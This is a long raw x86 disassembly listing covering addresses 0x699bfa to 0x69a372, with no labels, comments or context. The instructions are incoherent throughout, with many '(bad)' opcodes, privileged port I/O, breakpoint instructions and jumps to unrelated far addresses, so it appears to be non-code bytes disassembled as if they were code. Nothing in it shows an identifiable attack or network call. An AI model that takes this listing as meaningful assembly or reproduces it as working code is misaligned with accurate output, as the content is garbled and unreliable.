  699bfa:	scas   eax,DWORD PTR es:[edi]
  699bfb:	inc    ebx
  699bfc:	sbb    BYTE PTR [ecx+0xa],bl
  699bff:	inc    eax
  699c00:	mov    ch,BYTE PTR [edx]
  699c02:	outs   dx,BYTE PTR ds:[esi]
  699c03:	jnp    0x699c2d
  699c05:	outs   dx,BYTE PTR ds:[esi]
  699c06:	inc    esi
  699c07:	xchg   ebp,eax
  699c08:	pop    es
  699c09:	lea    edi,[eax-0x17d09d2f]
  699c0f:	adc    BYTE PTR [ebp+0x5b],dh
  699c12:	inc    edi
  699c13:	(bad)  
  699c14:	arpl   WORD PTR [ebx],si
  699c16:	mov    esi,0x9b3608b6
  699c1b:	or     bl,bl
  699c1d:	and    BYTE PTR [ebx],al
  699c1f:	and    al,0xb3
  699c21:	in     eax,0x22
  699c23:	icebp  
  699c24:	jecxz  0x699baa
  699c26:	xchg   esi,eax
  699c27:	cmp    eax,ebx
  699c29:	call   DWORD PTR [edi+0xe71e133]
  699c2f:	inc    ebx
  699c30:	ja     0x699c7d
  699c32:	ja     0x699c11
  699c34:	data16 adc ah,BYTE PTR [ebp-0x6d251b28]
  699c3b:	mov    ds:0x1cc37c34,eax
  699c40:	sub    eax,0x8be5511a
  699c45:	push   esp
  699c46:	mov    dl,0x4d
  699c48:	jmp    0x699c78
  699c4a:	mov    ecx,0x9e5082b
  699c4f:	jns    0x699c0d
  699c51:	or     dl,BYTE PTR [esi+0x68]
  699c54:	push   cs
  699c55:	mov    cl,BYTE PTR [ebx]
  699c57:	ins    BYTE PTR es:[edi],dx
  699c58:	mov    al,cl
  699c5a:	mov    ebx,0xaa5e137e
  699c5f:	(bad)  
  699c60:	jmp    0xa4692d48
  699c65:	cmp    DWORD PTR [edi],eax
  699c67:	jl     0x699c09
  699c69:	nop
  699c6a:	loope  0x699c20
  699c6c:	inc    ecx
  699c6d:	xchg   BYTE PTR [eax+0x4e08cd9],ch
  699c73:	pmaxub mm3,QWORD PTR [di]
  699c77:	mov    eax,ds:0xe165ed92
  699c7c:	inc    ecx
  699c7d:	sub    eax,0x1db0f6ec
  699c82:	push   0x406ea95b
  699c87:	cwde   
  699c88:	cmp    al,0x87
  699c8a:	imul   esi,ebp,0x63
  699c8d:	jmp    0x699c8e
  699c8f:	mov    ebp,0x682b8bd0
  699c94:	aas    
  699c95:	add    DWORD PTR [esi+0xb16ca1e],esi
  699c9b:	out    dx,al
  699c9c:	pop    ebp
  699c9d:	cld    
  699c9e:	in     al,0x49
  699ca0:	pop    ds
  699ca1:	rcl    esi,1
  699ca3:	jns    0x699d1e
  699ca5:	jae    0x699c5b
  699ca7:	je     0x699ccb
  699ca9:	sbb    esi,DWORD PTR [ebp-0x1b]
  699cac:	mov    edi,0x82b5ca04
  699cb1:	(bad)  
  699cb3:	loop   0x699c55
  699cb5:	xlat   BYTE PTR ds:[ebx]
  699cb6:	adc    ch,BYTE PTR [esi-0x39]
  699cb9:	lods   al,BYTE PTR ds:[esi]
  699cba:	loopne 0x699d1a
  699cbc:	rdpmc  
  699cbe:	icebp  
  699cbf:	jmp    0x699c4a
  699cc1:	inc    ecx
  699cc2:	sbb    esi,DWORD PTR [edx+edi*8-0x203471f2]
  699cc9:	inc    ecx
  699cca:	addr16 jle 0x699c58
  699ccd:	outs   dx,DWORD PTR ds:[esi]
  699cce:	test   BYTE PTR [edi+0x3a],0xd5
  699cd2:	lods   al,BYTE PTR ds:[esi]
  699cd3:	xchg   ebp,eax
  699cd4:	sbb    ecx,DWORD PTR [eax-0x2]
  699cd7:	cmp    edi,eax
  699cd9:	js     0x699cb3
  699cdb:	dec    ecx
  699cdc:	into   
  699cdd:	add    eax,0xb593d01
  699ce2:	sbb    al,0x22
  699ce4:	pop    ebp
  699ce5:	out    dx,eax
  699ce6:	loope  0x699ced
  699ce8:	mov    cl,0xd
  699cea:	xor    ecx,ecx
  699cec:	rcr    BYTE PTR [esi],cl
  699cee:	js     0x699d12
  699cf0:	iret   
  699cf1:	(bad)  
  699cf2:	sub    edi,DWORD PTR [ebx+0xea8931d]
  699cf8:	push   esi
  699cf9:	inc    ebp
  699cfa:	inc    ecx
  699cfb:	inc    DWORD PTR [esi+0x3e]
  699cfe:	pop    edx
  699cff:	loop   0x699d4f
  699d01:	push   esi
  699d02:	ror    DWORD PTR [ecx+0x3373a94f],cl
  699d08:	mov    edi,0x11dc29c9
  699d0d:	xchg   edx,eax
  699d0e:	mov    ds:0x68fd6938,eax
  699d13:	cli    
  699d14:	xor    ecx,DWORD PTR [ecx+0x595ded42]
  699d1a:	sub    eax,0x18ef6eb0
  699d1f:	repnz xchg bx,ax
  699d22:	mov    ss,WORD PTR [esi-0x64]
  699d25:	repnz clc 
  699d27:	xchg   esi,eax
  699d28:	lea    ebx,[edi]
  699d2a:	jno    0x699d00
  699d2c:	cdq    
  699d2d:	sub    bh,BYTE PTR [ecx+0x75ab53]
  699d33:	shl    BYTE PTR [edi],cl
  699d35:	popa   
  699d36:	push   esp
  699d37:	in     eax,dx
  699d38:	mov    eax,ds:0x1fcdb5fd
  699d3d:	jg     0x699d92
  699d3f:	loopne 0x699d2c
  699d41:	and    esp,esp
  699d43:	ins    DWORD PTR es:[edi],dx
  699d44:	pop    eax
  699d45:	fcmovb st,st(0)
  699d47:	push   ebx
  699d48:	in     eax,0x3c
  699d4a:	dec    edi
  699d4b:	sub    DWORD PTR [edi],esi
  699d4d:	sbb    DWORD PTR [edi-0xc7f12b8],esp
  699d53:	or     eax,0xa7cf10c6
  699d58:	jbe    0x699d47
  699d5a:	adc    al,0x7a
  699d5c:	cmp    BYTE PTR [ecx-0x6a],dl
  699d5f:	sbb    ch,BYTE PTR [eax+0x77fdce82]
  699d65:	xor    DWORD PTR [esi+0x6dfd9f3],esi
  699d6b:	int    0x1f
  699d6d:	out    0x80,eax
  699d6f:	(bad)  
  699d70:	std    
  699d71:	dec    esi
  699d72:	pop    eax
  699d73:	cli    
  699d74:	int3   
  699d75:	dec    ebp
  699d76:	lds    ebx,FWORD PTR ds:[ebx+0x5b49d2d9]
  699d7d:	push   edi
  699d7e:	add    al,0x0
  699d80:	adc    DWORD PTR [ecx+0x4d723011],edi
  699d86:	repnz inc esp
  699d88:	cli    
  699d89:	gs mov dh,0x29
  699d8c:	sub    ebx,DWORD PTR [ebx]
  699d8e:	adc    al,dl
  699d90:	mov    al,0x96
  699d92:	and    DWORD PTR [edi+0x1bf9cd83],ebx
  699d98:	repnz sub BYTE PTR [edi-0x2f85578f],ch
  699d9f:	pop    ebx
  699da0:	pop    esi
  699da1:	mov    ebp,0x459c52b6
  699da6:	imul   DWORD PTR [edi-0x11]
  699da9:	dec    ebx
  699daa:	dec    ecx
  699dab:	leave  
  699dac:	pop    es
  699dad:	lock fsubr DWORD PTR [ebx+esi*8-0x1c4d41f9]
  699db5:	and    esi,ecx
  699db7:	(bad)  
  699db8:	mov    dl,BYTE PTR [edx+edi*1]
  699dbb:	into   
  699dbc:	in     al,0x59
  699dbe:	inc    esi
  699dbf:	push   ecx
  699dc0:	or     al,0x47
  699dc2:	dec    edx
  699dc3:	mov    ebx,0x5bf2222a
  699dc8:	xchg   edx,eax
  699dc9:	jns    0x699dad
  699dcb:	pop    ss
  699dcc:	cld    
  699dcd:	xchg   edi,eax
  699dce:	aas    
  699dcf:	sub    al,0x27
  699dd1:	sub    eax,0x471f96af
  699dd6:	pushf  
  699dd7:	setle  BYTE PTR [ebp-0x9713a74]
  699dde:	xchg   ebp,eax
  699ddf:	leave  
  699de0:	sbb    BYTE PTR [ebp+0x182e3169],dl
  699de6:	inc    eax
  699de7:	and    DWORD PTR [eax+0x5fbce2c0],0xe964e775
  699df1:	cwde   
  699df2:	nop
  699df3:	nop
  699df4:	test   eax,0xa6f459da
  699df9:	aaa    
  699dfa:	mov    ecx,0x965519f9
  699dff:	adc    bh,BYTE PTR [ecx]
  699e01:	lds    ebp,FWORD PTR [ecx-0x74]
  699e04:	nop
  699e05:	lds    ecx,FWORD PTR [edx-0x1cabc6f6]
  699e0b:	std    
  699e0c:	shl    DWORD PTR [ebx],0xd6
  699e0f:	mov    ebp,0xd4748f1f
  699e14:	jp     0x699daa
  699e16:	sub    BYTE PTR ds:[edi-0x76],ch
  699e1a:	lea    eax,[ebx+0x3f50044c]
  699e20:	push   eax
  699e21:	loopne 0x699da7
  699e23:	push   ds
  699e24:	fs pushf 
  699e26:	xor    esp,DWORD PTR [edi+0x1dbe9fd]
  699e2c:	mov    cs,WORD PTR [edx+0x6f]
  699e2f:	sbb    eax,0xb022dbe3
  699e34:	sbb    DWORD PTR [edi],edi
  699e36:	sbb    bh,bl
  699e38:	inc    edi
  699e39:	fnstenv [ebx+0x6a]
  699e3c:	shl    BYTE PTR [ebp-0x2c],1
  699e3f:	xor    al,dh
  699e41:	inc    ecx
  699e42:	jmp    0x4171f9ac
  699e47:	ret    
  699e48:	sub    eax,0xfb28894a
  699e4d:	xchg   ebp,eax
  699e4e:	add    BYTE PTR [ebx],0xf4
  699e51:	pushf  
  699e52:	cmp    edi,DWORD PTR [ebx+0x3aae61f]
  699e58:	jns    0x699e53
  699e5a:	inc    ebp
  699e5b:	cdq    
  699e5c:	jno    0x699e18
  699e5e:	pop    es
  699e5f:	ficomp WORD PTR [edx]
  699e61:	jno    0x699e67
  699e63:	ins    BYTE PTR es:[edi],dx
  699e64:	and    al,0xd0
  699e66:	jmp    0x4e1d772c
  699e6b:	pop    ebx
  699e6c:	and    eax,DWORD PTR [ebp+0x385241d8]
  699e72:	sbb    edx,DWORD PTR [ecx*1+0x75b2984f]
  699e79:	mov    cl,0x18
  699e7b:	inc    ebx
  699e7c:	fnstcw WORD PTR [ebx+0x75dc992c]
  699e82:	jle    0x699e29
  699e84:	(bad)  
  699e85:	fdivr  QWORD PTR [ecx-0x42]
  699e88:	xchg   ecx,eax
  699e89:	addr16 mov al,ds:0xe09c
  699e8d:	sbb    al,BYTE PTR [esi+0x7b]
  699e90:	in     eax,dx
  699e91:	loop   0x699ee3
  699e93:	cdq    
  699e94:	loop   0x699ed5
  699e96:	xor    eax,0x49ad557e
  699e9b:	mov    cl,0xdc
  699e9d:	fstp   TBYTE PTR [eax-0xc5227a3]
  699ea3:	test   esi,0x5f59101f
  699ea9:	(bad)  
  699eaa:	aas    
  699eab:	pop    ebx
  699eac:	mov    ah,0x1f
  699eae:	xchg   edx,eax
  699eaf:	loop   0x699edd
  699eb1:	push   esp
  699eb2:	mov    dl,0xfa
  699eb4:	cli    
  699eb5:	cdq    
  699eb6:	mov    ds:0xf87c2432,al
  699ebb:	jb     0x699e9b
  699ebd:	out    0xb5,al
  699ebf:	mov    esi,0x9cb85661
  699ec4:	sub    eax,0xaa3477c8
  699ec9:	jb     0x699ef1
  699ecb:	mov    BYTE PTR [edx+0x7e],al
  699ece:	xchg   ebp,eax
  699ecf:	fmul   DWORD PTR [ebx]
  699ed1:	lods   al,BYTE PTR ds:[esi]
  699ed2:	lods   eax,DWORD PTR ds:[esi]
  699ed3:	sub    dh,BYTE PTR [edi-0x3bb3e6df]
  699ed9:	jecxz  0x699f0d
  699edb:	cmp    al,BYTE PTR [edi]
  699edd:	imul   esi,edx,0xe7b7e6b2
  699ee3:	jbe    0x699ed4
  699ee5:	pop    ebx
  699ee6:	cmp    al,0xe2
  699ee8:	fisub  DWORD PTR [ebx+0x2a]
  699eeb:	into   
  699eec:	pushf  
  699eed:	cmp    al,0xd
  699eef:	psrld  mm3,QWORD PTR [edi+0x205f5af2]
  699ef6:	arpl   WORD PTR [ebx+0x643d6c49],sp
  699efc:	fnstcw WORD PTR [eax+edx*8]
  699eff:	push   edx
  699f00:	out    0x43,al
  699f02:	dec    eax
  699f03:	cli    
  699f04:	and    eax,0x65abcfe2
  699f09:	sub    esp,DWORD PTR [ebp-0x7]
  699f0c:	push   0x8aa8d0d8
  699f11:	stc    
  699f12:	fldenv [ecx-0x1b]
  699f15:	pop    ebp
  699f16:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  699f18:	inc    esp
  699f19:	xchg   ebp,eax
  699f1a:	mov    al,0xa5
  699f1c:	cmp    esp,esi
  699f1e:	or     cl,bh
  699f20:	arpl   WORD PTR [esi+0x50],ax
  699f23:	js     0x699ee3
  699f25:	sub    edx,esi
  699f27:	jne    0x699f7b
  699f29:	test   dh,bl
  699f2b:	mov    al,ds:0x98bac314
  699f30:	test   BYTE PTR [ebp-0x2ef589f9],cl
  699f36:	push   ss
  699f37:	and    al,0xb1
  699f39:	mov    WORD PTR [ebp+0x7165cee3],cs
  699f3f:	lds    ebx,FWORD PTR [eax+0x2b73d4b]
  699f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  699f46:	(bad)  
  699f48:	fidiv  DWORD PTR [edi]
  699f4a:	cmp    eax,0xb1c1c5ee
  699f4f:	test   DWORD PTR [ebx+0x2b],0xe5aca8ae
  699f56:	mov    bh,0x74
  699f58:	and    al,0xd0
  699f5a:	mov    bl,0xed
  699f5c:	jno    0x699f8a
  699f5e:	mov    dh,0xe9
  699f60:	push   eax
  699f61:	pop    esi
  699f62:	xlat   BYTE PTR ds:[ebx]
  699f63:	push   eax
  699f64:	lods   al,BYTE PTR ds:[esi]
  699f65:	sub    edi,ebp
  699f67:	(bad)  
  699f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  699f69:	dec    edx
  699f6a:	repnz shr bl,1
  699f6d:	xlat   BYTE PTR ds:[ebx]
  699f6e:	mov    cs,WORD PTR [esi-0x271acb6]
  699f74:	adc    ebp,esp
  699f76:	sar    BYTE PTR [ecx-0x25394ef7],cl
  699f7c:	enter  0x5ddf,0xc5
  699f80:	neg    ecx
  699f82:	test   BYTE PTR [esi+0x21186550],0x80
  699f89:	aas    
  699f8a:	nop
  699f8b:	lods   al,BYTE PTR ds:[esi]
  699f8c:	imul   ebp,edi,0xffffffa2
  699f8f:	pop    eax
  699f90:	repnz inc ebx
  699f92:	or     eax,0x73107d6c
  699f97:	dec    ecx
  699f98:	addr16 sub al,0x44
  699f9b:	sbb    al,0xab
  699f9d:	xor    BYTE PTR [edi-0x58],dh
  699fa0:	dec    esp
  699fa1:	dec    ebx
  699fa2:	mov    ecx,0xe5d6ae66
  699fa7:	push   ss
  699fa8:	jae    0x699f4b
  699faa:	mov    esp,0xc219dddb
  699faf:	out    dx,eax
  699fb0:	stos   BYTE PTR es:[edi],al
  699fb1:	popf   
  699fb2:	dec    eax
  699fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  699fb4:	mov    al,0x80
  699fb6:	pop    eax
  699fb7:	loope  0x699fce
  699fb9:	in     al,dx
  699fba:	push   ss
  699fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  699fbc:	xchg   edx,ecx
  699fbe:	xor    esp,DWORD PTR [esi+0x3278b0cc]
  699fc4:	in     al,dx
  699fc5:	repz shl DWORD PTR [ecx-0x3933a049],cl
  699fcc:	mov    ebp,0x2f82b6f5
  699fd1:	out    0xd0,al
  699fd3:	clc    
  699fd4:	add    ah,BYTE PTR [eax]
  699fd6:	jnp    0x69a03d
  699fd8:	loope  0x69a00c
  699fda:	jbe    0x69a03b
  699fdc:	nop
  699fdd:	jb     0x69a05c
  699fdf:	addr16 aad 0x7c
  699fe2:	les    edx,FWORD PTR [esi]
  699fe4:	retf   
  699fe5:	push   es
  699fe6:	xor    eax,0x2c1d4379
  699feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  699fec:	hlt    
  699fed:	mov    esi,0xe9aa9c0e
  699ff2:	into   
  699ff3:	rol    BYTE PTR [edx-0x5a],cl
  699ff6:	jno    0x69a00d
  699ff8:	xchg   ebp,eax
  699ff9:	jbe    0x69a048
  699ffb:	ficomp WORD PTR [esi-0x77]
  699ffe:	pop    ebp
  699fff:	lea    eax,[esi+0x7f7a685c]
  69a005:	pop    es
  69a006:	inc    ebx
  69a007:	inc    ecx
  69a008:	icebp  
  69a009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69a00a:	fsubrp st(0),st
  69a00c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69a00d:	test   eax,0x9bc10c9
  69a012:	cmp    DWORD PTR [edx],esi
  69a014:	fnsetpm(287 only) 
  69a016:	jnp    0x69a07b
  69a018:	mov    esi,0xc6f11eba
  69a01d:	push   sp
  69a01f:	rcr    BYTE PTR [ebp+esi*8-0x21d448d0],0x1b
  69a027:	sub    BYTE PTR [ebp+0x10853a15],ah
  69a02d:	pop    esi
  69a02e:	mov    esi,gs
  69a030:	xchg   ebx,eax
  69a031:	adc    eax,DWORD PTR [edx]
  69a033:	(bad)  
  69a035:	gs adc ecx,ecx
  69a038:	cmp    ebp,DWORD PTR [ebx]
  69a03a:	push   0x76
  69a03c:	repz mov edx,0x9c334c2a
  69a042:	or     eax,0x1064b343
  69a047:	inc    ebp
  69a048:	sbb    eax,0xee1d34d
  69a04d:	xor    edi,eax
  69a04f:	bt     DWORD PTR [edx],esi
  69a052:	test   al,0x39
  69a054:	sbb    al,0x7f
  69a056:	call   0xd969871a
  69a05b:	test   DWORD PTR [ebx-0x4],edx
  69a05e:	jo     0x69a042
  69a060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69a061:	arpl   WORD PTR ds:0x6a76e8ca,cx
  69a067:	ret    0xd48d
  69a06a:	cmp    dh,BYTE PTR [ebx+0x6e]
  69a06d:	xchg   ebx,eax
  69a06e:	dec    ebp
  69a06f:	jmp    0xbe75:0x359cf638
  69a076:	(bad)  
  69a077:	and    bl,BYTE PTR [edi-0x5b3e2f12]
  69a07d:	iret   
  69a07e:	pop    ebx
  69a07f:	push   0xfffffff2
  69a081:	fild   QWORD PTR [edi+edi*8+0x3f]
  69a085:	jo     0x69a081
  69a087:	int    0x50
  69a089:	pusha  
  69a08a:	outs   dx,DWORD PTR ds:[esi]
  69a08b:	lds    esp,FWORD PTR [esi-0x27c42c14]
  69a091:	(bad)  
  69a092:	fist   DWORD PTR [edx+0x50]
  69a095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69a096:	lds    esi,FWORD PTR [edi]
  69a098:	(bad)  
  69a099:	pop    esi
  69a09a:	shr    eax,0xa9
  69a09d:	rcl    BYTE PTR [esp+esi*2+0x23583455],cl
  69a0a4:	inc    esp
  69a0a5:	stos   BYTE PTR es:[edi],al
  69a0a6:	fstp   TBYTE PTR [edi+0x45]
  69a0a9:	sub    al,0x3c
  69a0ab:	int3   
  69a0ac:	sub    bl,BYTE PTR [edx-0x11]
  69a0af:	lds    ecx,FWORD PTR [edx-0xd]
  69a0b2:	scas   eax,DWORD PTR es:[edi]
  69a0b3:	adc    al,0xbe
  69a0b5:	aaa    
  69a0b6:	dec    ebp
  69a0b7:	sbb    eax,0xb5e6d061
  69a0bc:	int    0x4b
  69a0be:	mov    edx,ecx
  69a0c0:	mov    ah,0x9f
  69a0c2:	mov    ebx,ebp
  69a0c4:	cmp    al,0xf2
  69a0c6:	push   0xd77cf80d
  69a0cb:	pop    edx
  69a0cc:	sub    DWORD PTR [edi+0x339e7de9],ebp
  69a0d2:	cli    
  69a0d3:	inc    esi
  69a0d4:	sar    ebx,0x29
  69a0d7:	(bad)  
  69a0d8:	dec    edi
  69a0d9:	or     BYTE PTR [ebx-0x4de17a49],cl
  69a0df:	xchg   edx,eax
  69a0e0:	nop
  69a0e1:	pop    edx
  69a0e2:	jo     0x69a123
  69a0e4:	ret    
  69a0e5:	mov    esi,es
  69a0e7:	sub    DWORD PTR [ecx-0x67f95bfc],0xffffff8b
  69a0ee:	sbb    ah,BYTE PTR [edi]
  69a0f0:	repz dec edi
  69a0f2:	cdq    
  69a0f3:	push   edx
  69a0f4:	jnp    0x69a103
  69a0f6:	mov    edi,0xd3b14991
  69a0fb:	jp     0x69a13e
  69a0fd:	ds cmp eax,0x8668243c
  69a103:	pop    esi
  69a104:	xlat   BYTE PTR ds:[ebx]
  69a105:	sub    esp,DWORD PTR [ecx+0x2b]
  69a108:	xchg   esi,eax
  69a109:	ins    BYTE PTR es:[edi],dx
  69a10a:	jo     0x69a0e2
  69a10c:	call   0xd7d7:0x2b37ae98
  69a113:	ins    DWORD PTR es:[edi],dx
  69a114:	push   DWORD PTR [edx+0x73]
  69a117:	inc    ebp
  69a118:	gs sar edx,0x96
  69a11c:	sbb    eax,0xc18001ce
  69a121:	test   DWORD PTR [ecx],ecx
  69a123:	push   esp
  69a124:	fwait
  69a125:	sahf   
  69a126:	arpl   di,si
  69a128:	xchg   esp,eax
  69a129:	xchg   ebp,eax
  69a12a:	(bad)  
  69a12b:	cmp    cl,al
  69a12d:	(bad)  
  69a12e:	outs   dx,BYTE PTR ds:[esi]
  69a12f:	sti    
  69a130:	xor    ecx,DWORD PTR [ebp-0x69ab964e]
  69a136:	out    dx,al
  69a137:	jle    0x69a174
  69a139:	call   0xcbbe:0xf7fa24e0
  69a140:	pop    ebp
  69a141:	dec    edi
  69a142:	shl    BYTE PTR [ebp+0xd],0xc9
  69a146:	out    dx,al
  69a147:	jecxz  0x69a133
  69a149:	inc    esi
  69a14a:	test   al,0xa9
  69a14c:	push   eax
  69a14d:	xor    ebx,ebp
  69a14f:	(bad)  
  69a150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69a151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69a152:	xchg   esp,eax
  69a153:	add    edx,DWORD PTR [ebp-0x7d77f376]
  69a159:	xor    eax,0x7647ce4e
  69a15e:	repnz cmp BYTE PTR [edx],ch
  69a161:	loopne 0x69a15c
  69a163:	jp     0x69a13d
  69a165:	xchg   esp,eax
  69a166:	shl    bh,cl
  69a168:	es dec ebp
  69a16a:	inc    ecx
  69a16b:	rcl    BYTE PTR [eax-0x6e],0x21
  69a16f:	mov    ebx,0x5a2e1c83
  69a174:	shl    DWORD PTR [ebx+edx*2+0x2b],cl
  69a178:	(bad)  
  69a17a:	sar    ebx,1
  69a17c:	fdivr  QWORD PTR [ebp-0x66]
  69a17f:	add    al,0x46
  69a181:	or     ebx,DWORD PTR [esi]
  69a183:	xchg   edx,eax
  69a184:	pop    ss
  69a185:	pop    ebx
  69a186:	cmp    DWORD PTR [eax+0x2b3b0554],esp
  69a18c:	inc    ecx
  69a18d:	frstor [edx]
  69a18f:	add    bl,BYTE PTR [esp+ebp*4+0x59]
  69a193:	pop    eax
  69a194:	repnz sbb DWORD PTR [ebx],ebx
  69a197:	test   DWORD PTR [ebp-0x32],edi
  69a19a:	inc    edx
  69a19b:	and    cl,BYTE PTR [ebx]
  69a19d:	cmp    esi,DWORD PTR [ebx-0x61]
  69a1a0:	mov    ds:0x69e11618,al
  69a1a5:	cmp    eax,eax
  69a1a7:	fyl2xp1 
  69a1a9:	inc    edx
  69a1aa:	push   edi
  69a1ab:	shr    BYTE PTR ds:0x4964ac59,cl
  69a1b1:	or     cl,BYTE PTR [ecx+0x7606d8d1]
  69a1b7:	loopne 0x69a176
  69a1b9:	push   0xffffffb0
  69a1bb:	mov    ecx,0xd57d6f61
  69a1c0:	imul   edx,esp,0xf8f876af
  69a1c6:	mov    dl,0xba
  69a1c8:	icebp  
  69a1c9:	int3   
  69a1ca:	or     eax,0xd0a3bba9
  69a1cf:	shl    DWORD PTR [esi+0x6b906620],1
  69a1d5:	adc    edi,edi
  69a1d7:	or     edi,0x9
  69a1da:	outs   dx,BYTE PTR ds:[esi]
  69a1db:	xchg   edx,eax
  69a1dc:	mov    al,fs:0x255c3090
  69a1e2:	push   esi
  69a1e3:	sub    esp,eax
  69a1e5:	lock dec eax
  69a1e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69a1e8:	fstp   DWORD PTR [ecx]
  69a1ea:	in     al,0xae
  69a1ec:	(bad)  
  69a1ed:	pop    edx
  69a1ee:	mov    WORD PTR [ebx-0x66],?
  69a1f1:	sub    DWORD PTR [ebx-0x34],edi
  69a1f4:	in     al,dx
  69a1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69a1f6:	jmp    0xf1b1e829
  69a1fb:	adc    ecx,esi
  69a1fd:	push   eax
  69a1fe:	dec    eax
  69a1ff:	in     al,dx
  69a200:	mov    ch,0x16
  69a202:	out    dx,al
  69a203:	mov    DWORD PTR [ebx+0x16],edi
  69a206:	and    DWORD PTR ds:[edx-0x579e19be],eax
  69a20d:	int    0x6f
  69a20f:	rcl    DWORD PTR [eax+eiz*1],1
  69a212:	fadd   DWORD PTR [edi+ebx*4+0x45]
  69a216:	enter  0x87b6,0x22
  69a21a:	test   eax,0x792b5a5a
  69a21f:	in     eax,0xca
  69a221:	int3   
  69a222:	sub    al,0x5
  69a224:	inc    ecx
  69a225:	sbb    eax,0x1866e40b
  69a22a:	ffreep st(5)
  69a22c:	ret    0x502f
  69a22f:	add    BYTE PTR [ecx-0x675f7c99],dh
  69a235:	retf   
  69a236:	xchg   edi,eax
  69a237:	pop    edx
  69a238:	sub    al,0x8b
  69a23a:	dec    edi
  69a23b:	add    DWORD PTR [esi],edx
  69a23d:	cmp    DWORD PTR [esi-0x551a3a00],eax
  69a243:	sub    al,0x6f
  69a245:	jmp    0x69a247
  69a247:	sub    BYTE PTR cs:[edi-0x79a4d1e],0xde
  69a24f:	mov    eax,ds:0x1d78486b
  69a254:	mov    ch,0x9a
  69a256:	xor    eax,DWORD PTR [ecx-0x77d59aa5]
  69a25c:	pop    eax
  69a25d:	push   ecx
  69a25e:	ss push es
  69a260:	push   ebp
  69a261:	dec    ecx
  69a262:	adc    dh,BYTE PTR [ecx+0x4e46b5f1]
  69a268:	inc    ecx
  69a269:	pop    eax
  69a26a:	lds    esp,FWORD PTR [ecx+0x7bf6c6b4]
  69a270:	popf   
  69a271:	push   0xffffffeb
  69a273:	out    dx,eax
  69a274:	sbb    ebp,DWORD PTR [ecx-0x33211529]
  69a27a:	scas   eax,DWORD PTR es:[edi]
  69a27b:	aam    0x9b
  69a27d:	into   
  69a27e:	arpl   WORD PTR ds:0x4cfeee7,bx
  69a284:	sub    bh,BYTE PTR ds:0xe1932087
  69a28a:	outs   dx,BYTE PTR ds:[esi]
  69a28b:	stos   BYTE PTR es:[edi],al
  69a28c:	outs   dx,BYTE PTR ds:[esi]
  69a28d:	pop    es
  69a28e:	mov    edi,0x967886e9
  69a293:	and    eax,0x4a0ff65d
  69a298:	int    0x41
  69a29a:	shl    DWORD PTR ds:0xbfb16b3f,0x5f
  69a2a1:	arpl   WORD PTR [esi-0x537c2fe1],di
  69a2a7:	popa   
  69a2a8:	pop    eax
  69a2a9:	mov    bl,0x94
  69a2ab:	(bad)  
  69a2ac:	ss sahf 
  69a2ae:	sub    eax,0xd4acde64
  69a2b3:	cmp    eax,0x9b0c21bd
  69a2b8:	sub    eax,0xf6ec5ac7
  69a2bd:	push   ebp
  69a2be:	mov    cl,0xc9
  69a2c0:	in     eax,dx
  69a2c1:	iret   
  69a2c2:	add    bl,bh
  69a2c4:	sub    eax,0xa34da674
  69a2c9:	repz enter 0x8fd9,0xf8
  69a2ce:	adc    bh,BYTE PTR [edx+0x19]
  69a2d1:	imul   esi,DWORD PTR [eax-0x7720a3b0],0xffffff8a
  69a2d8:	inc    eax
  69a2d9:	or     dh,BYTE PTR [ecx-0x57066d64]
  69a2df:	lods   al,BYTE PTR ds:[esi]
  69a2e0:	out    0xad,eax
  69a2e2:	mov    ebx,0x9202b1cf
  69a2e7:	adc    eax,DWORD PTR ss:[esi-0x7520e47e]
  69a2ee:	inc    ecx
  69a2ef:	fcmovne st,st(5)
  69a2f1:	lods   al,BYTE PTR ds:[esi]
  69a2f2:	adc    al,BYTE PTR [ebx]
  69a2f4:	push   ebx
  69a2f5:	push   esi
  69a2f6:	fsubr  st,st(5)
  69a2f8:	loop   0x69a282
  69a2fa:	sbb    DWORD PTR [ebp+ecx*2+0x29],esp
  69a2fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69a2ff:	rcr    DWORD PTR [ebx+0x6ddfd9c2],1
  69a305:	and    BYTE PTR [esi],dl
  69a307:	mov    esi,edx
  69a309:	inc    esp
  69a30a:	sar    DWORD PTR [edi+0x46cbdb83],0x70
  69a311:	or     al,0x74
  69a313:	(bad)  
  69a315:	adc    cl,BYTE PTR [eax-0x6c103d54]
  69a31b:	and    DWORD PTR [edx-0x6d],esi
  69a31e:	pop    esi
  69a31f:	test   al,0x8e
  69a321:	xadd   BYTE PTR [ebp+0x75],ah
  69a325:	aaa    
  69a326:	das    
  69a327:	out    0xb5,eax
  69a329:	repnz scas al,BYTE PTR es:[edi]
  69a32b:	ja     0x69a39a
  69a32d:	sbb    bh,bh
  69a32f:	jb     0x69a3a0
  69a331:	mov    edi,0x1a67af6e
  69a336:	dec    esi
  69a337:	jne    0x69a308
  69a339:	adc    bh,0xb9
  69a33c:	jge    0x69a3a0
  69a33e:	mov    eax,0x2e60fa4b
  69a343:	mov    WORD PTR [ecx],es
  69a345:	and    bh,cl
  69a347:	push   ds
  69a348:	inc    ebx
  69a349:	mov    ah,0x37
  69a34b:	adc    eax,0x722b2ae4
  69a350:	push   cs
  69a351:	adc    esp,eax
  69a353:	stc    
  69a354:	pushf  
  69a355:	enter  0xe253,0x48
  69a359:	sub    BYTE PTR [ebx+0x54],ah
  69a35c:	mov    bh,0x2e
  69a35e:	jle    0x69a307
  69a360:	push   esp
  69a361:	je     0x69a33b
  69a363:	push   0x46
  69a365:	test   al,0xe6
  69a367:	mov    BYTE PTR [edi+0x50],ah
  69a36a:	aad    0x63
  69a36c:	mov    bh,0xb6
  69a36e:	out    dx,al
  69a36f:	retf   
  69a370:	mov    ch,0xf4
  69a372:	xchg   esp,eax
